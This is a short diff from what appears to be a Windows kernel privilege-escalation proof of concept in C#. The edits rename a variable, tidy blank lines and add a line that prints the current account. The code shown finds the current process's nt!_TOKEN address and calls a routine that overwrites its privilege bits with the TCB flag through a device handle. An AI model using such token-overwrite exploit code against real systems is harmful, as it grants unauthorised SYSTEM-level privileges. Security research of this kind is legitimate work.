@@ -1500,28 +1500,27 @@ namespace TcbS4uAssignTokenVariant
             if (!Environment.Is64BitOperatingSystem)
             {
                 Console.WriteLine("[!] 32 bit OS is not supported.\n");
-
                 return;
             }
             else if (IntPtr.Size != 8)
             {
                 Console.WriteLine("[!] Should be built with 64 bit pointer.\n");
-
                 return;
             }
 
+            Console.WriteLine("[*] Current account is \"{0}\\{1}\"", Environment.UserDomainName, Environment.UserName);
             Console.WriteLine("[>] Trying to find token address for this process.");
 
-            IntPtr pTokenPointer = GetCurrentProcessTokenPointer();
+            IntPtr pCurrentToken = GetCurrentProcessTokenPointer();
 
-            if (pTokenPointer == IntPtr.Zero)
+            if (pCurrentToken == IntPtr.Zero)
             {
                 Console.WriteLine("[-] Failed to find nt!_TOKEN.");
                 return;
             }
             else
             {
-                Console.WriteLine("[+] nt!_TOKEN for this process @ 0x{0}", pTokenPointer.ToString("X16"));
+                Console.WriteLine("[+] nt!_TOKEN for this process @ 0x{0}", pCurrentToken.ToString("X16"));
             }
 
             do
@@ -1560,7 +1559,7 @@ namespace TcbS4uAssignTokenVariant
 
                 Console.WriteLine("[>] Trying to overwrite token.");
 
-                status = OverwriteTokenPrivileges(hDevice, pTokenPointer, (ulong)SepTokenPrivilegesFlags.TCB);
+                status = OverwriteTokenPrivileges(hDevice, pCurrentToken, (ulong)SepTokenPrivilegesFlags.TCB);
                 CloseHandle(hDevice);
 
                 if (!status)
